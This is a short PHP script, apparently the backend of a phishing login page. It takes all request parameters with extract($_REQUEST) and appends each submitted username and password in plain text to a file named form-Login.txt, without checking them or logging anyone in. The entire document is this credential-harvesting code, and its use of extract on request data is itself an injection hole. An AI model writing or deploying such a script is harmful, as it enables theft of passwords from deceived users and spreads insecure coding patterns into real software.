<?php
    extract($_REQUEST);
    $file=fopen("form-Login.txt","a");

    fwrite($file,"name :");
    fwrite($file, $username ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fclose($file);
 ?>
